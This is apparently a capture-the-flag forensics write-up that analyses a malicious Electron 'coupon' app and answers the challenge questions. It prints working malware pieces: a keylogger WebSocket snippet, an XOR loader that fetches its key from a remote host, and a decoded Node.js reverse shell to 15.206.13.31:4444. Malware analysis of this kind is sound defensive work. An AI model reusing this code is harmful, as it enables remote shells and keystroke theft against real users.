## 1. What is the process name of malicious NodeJS application?
- After extracting zip file I got a file named Electron-Coupon.exe, run file and monitor by Process Monitor, I realize that it creates a lot of files and directories in ***temp*** forlder of current user : **2nh78HjW4I1UbPcZfuqfAfFcigm**
- Inspect this dir, found process name is Coupon.exe
- Coupon.exe
## 2. Which option has the attacker enabled in the script to run the malicious Node.js application?
- upon a time searching, I understood electron node js app, in resources dir, found an app.asar, this is a archive specified for electron app, which bundled source code into archive, install nodejs and use npx to extract it
```bash
npx asar extract app.asar app
```
- Now, I have real code, let's analyse it
```bash
$ ls
build.txt  extraResources/  index.js  node_modules/  package.json  public/
```
- Firstly, check index.js
```js
mainWindow = new BrowserWindow({ width: 800, height: 600,
	  webPreferences: {
		contextIsolation: false,
		nodeIntegration: true,
		nodeIntegrationInWorker: true,
		preload: path.resolve(`${process.resourcesPath}/../extraResources/preload.js`)
	}});
```
- We see noteIntegration is enable, which means Nodejs resources is allowed to access by rederer thread ([nodeintegration](https://v1.quasar.dev/quasar-cli/developing-electron-apps/node-integration))
- nodeintegration
## 3. What protocol and port number is the attacker using to transmit the victim's keystrokes?
- Analyse keytroke.js file, we can see attacker open a socket:
```bash
if ("WebSocket" in window)
{
  var socket = new WebSocket("ws://0.0.0.0:44500");
  var all_input_fields = document.getElementsByTagName("input");
  var page_url = document.baseURI;
  var now = Date();
```
- websocket, 44500
## 4. What XOR key is the attacker using to decode the encoded shellcode?
```bash
var options = {
  host: '0.0.0.0',
  port: 80,
  path: '/'
};

http.get(options, function(res) {
  var body = '';
  res.on('data', function(chunk) {
    body += chunk;
  });
  res.on('end', function() {
	
	var b64string = "xHiVWo9qiVuCNslP4RTAFMw+llWePo5RmD7dFJ57kUGFbIUcznCFQM43zDnmPsAUzD7AFMx9kBTRPpJRnWuJRok2wleEd4xQs26SW497k0fON8w55j7AFMw+wBTMbYgU0T6DRMJtkFWbcMgWj3OEGolmhRbAPrtpxSXtPsw+wBSaf5IUj3KJUYJqwAnMcIVDzHCFQMJNj1eHe5QcxSXtPsw+wBSPcolRgmrOV4NwjlGPasgA2CrUGMw80QHCLNACwi/TGt8vwhjMeJVaj2qJW4I2yU/hFMAUzD7AFMw+g1iFe45Awm6JRIk2k1zCbZRQhXDJD+EUwBTMPsAUzD6TXMJtlFCDa5QanHeQUcR9jF2JcJQd1xPqFMw+wBTMPsBHhDCTQIh7kkbCbolEiTaDWIV7jkDFJe0+zD7AFJE32znmPsAUzGyFQJlsjhTDf88PzDHPFLxshUKJcJRHzGqIUcxQj1CJMIpHzH+QRIB3g1WYd49azHiPRoE+g0aNbYhdgnntPpE3yB3X";
	
	var str = Buffer.from(b64string, 'base64');

	let keyBuf = Buffer.from(body, 'hex')
	let strBuf = Buffer.from(str, 'hex')
	let outBuf = Buffer.alloc(strBuf.length)

	for (let n = 0; n < strBuf.length; n++)
		outBuf[n] = strBuf[n] ^ keyBuf[n % keyBuf.length]

	//console.log(outBuf.toString())
	var code = outBuf.toString()
	var script = new vm.Script(code);
	var context = vm.createContext({ require: require });

	script.runInNewContext(context);
	
  });
}).on('error', function(e) {
  console.log("Got error: " + e.message);
});
};

```
- In preload.js, we can see that shellcode is base64 encoded and xor with a key, key is got from body var, which get from / uri in port 80, let's check pcap file of this challenge
```bash
GET / HTTP/1.1
Host: 15.206.13.31
Connection: close


HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.10.12
Date: Mon, 21 Oct 2024 14:17:16 GMT

ec1ee034ec1ee034
```
- ec1ee034ec1ee034
## 5. What is the IP address, port number and process name encoded in the attacker payload ?
- we have the key, now we need decode shellcode by **decode.py**
```js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("cmd.exe", []);
    var client = new net.Socket();
    client.connect(4444, "15.206.13.31", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```
- 15.206.13.31, 4444, cmd.exe
## 6. What are the two commands the attacker executed after gaining the reverse shell?
- Follow ip and port tcp stream, I got the data
```bash
Microsoft Windows [Version 10.0.19045.5011]
(c) Microsoft Corporation. All rights reserved.

C:\Users\aarush.roy\AppData\Local\Temp\2nQEjgQoTUWEOTMLgNT36kFJRgz>
whoami

whoami
stored\aarush.roy

C:\Users\aarush.roy\AppData\Local\Temp\2nQEjgQoTUWEOTMLgNT36kFJRgz>
ipconfig

ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : forela.local
   Link-local IPv6 Address . . . . . : fe80::fde2:623f:3213:c2ed%3
   IPv4 Address. . . . . . . . . . . : 10.10.0.81
   Subnet Mask . . . . . . . . . . . : 255.255.255.224
   Default Gateway . . . . . . . . . : 10.10.0.65

C:\Users\aarush.roy\AppData\Local\Temp\2nQEjgQoTUWEOTMLgNT36kFJRgz>



C:\Users\aarush.roy\AppData\Local\Temp\2nQEjgQoTUWEOTMLgNT36kFJRgz>
exit

exit
```
- whoami, ipconfig

## 7. Which Node.js module and its associated function is the attacker using to execute the shellcode within V8 Virtual Machine contexts?
- examinate file preload.js , attacker require(vm) module to run code in a VM
```bash
var vm = require("vm");
var code = outBuf.toString()
var script = new vm.Script(code);
var context = vm.createContext({ require: require });

script.runInNewContext(context);
```
- vm, runInNewContext
## 8. Decompile the bytecode file included in the package and identify the Win32 API used to execute the shellcode.
- I tried to use idapro and ghidra to decompile script.jsc but get errors when analyzing, so, I tried the simplest way is using strings to get winapi name
```bash
strings script.jsc | awk 'length($0) > 9' | sort | uniq  
CreateThread
evalmachine.<anonymous>
readUint32LE
RtlMoveMemory
shellcode length:
thread id:
VirtualAlloc
WaitForSingleObject
```
- CreateThread
## 9. Submit the fake discount coupon that the attacker intended to present to the victim.
- Because strings did not help me find out coupon, also this is a small file, then I use HxD to trarse code in order, then I found something inresting
```bash
�������C�������O�������U�������P�������O�������N�������1�������3�������3�������7���������������P�������A�������W�������N�������E�������D���������������u�������s�������e�������r�������3�������2�������.�������d�������l�������l
```
- COUPON1337